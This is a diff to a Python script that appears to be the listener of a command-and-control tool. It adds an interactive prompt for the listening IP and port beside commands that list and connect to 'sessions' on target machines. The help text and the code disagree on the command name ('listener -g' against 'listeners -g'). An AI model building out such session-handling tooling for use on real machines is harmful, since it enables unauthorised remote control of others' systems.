@@ -16,6 +16,9 @@ def banner():
 def helpfile():
     print ('\n')
     print ('Usage:\n')
+    print ('LISTENER')
+    print ('listener -g' + ' ' * 22 + 'INPUT IP AND PORT FOR SOCKET\n')
+    print ('SESSIONS')  
     print ('sessions -l' + ' ' * 22 + 'LIST ACTIVE SESSIONS')
     print ('sessions -i [session number]' + ' ' * 5 + 'CONNECT TO SESSION')
     print ('\n')
@@ -51,7 +54,7 @@ def target_comm(targ_id):
 
 #Listener Handler Function
 def listener_handler():
-    sock.bind((host_ip, host_port))
+    sock.bind((host_ip, int(host_port)))
     print('[+] Server ready for client connection(s)...\n')
     sock.listen()
     t1 = threading.Thread(target=comm_handler)
@@ -91,19 +94,15 @@ if __name__ == '__main__':
     banner()
     kill_flag = 0
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    try:
-        host_ip=sys.argv[1]
-        host_port=int(sys.argv[2])
-    except IndexError:
-        print('Command line argument(s) missing. Expecting IPv4 Address and Port Number. Please try again.')
-    except Exception as e:
-        print(e)
-    listener_handler()
     while True:
         try:
             command = input('Command > ')
             if command == 'help' or command == '-h':
                 helpfile()
+            if command == 'listeners -g':
+                host_ip = input('Enter the IP to list on: ')
+                host_port  = input('Enter the port to listen on: ')
+                listener_handler()
             if command.split(" ")[0] == 'sessions': 
                 session_counter = 0
                 if command.split(" ")[1] == '-l':
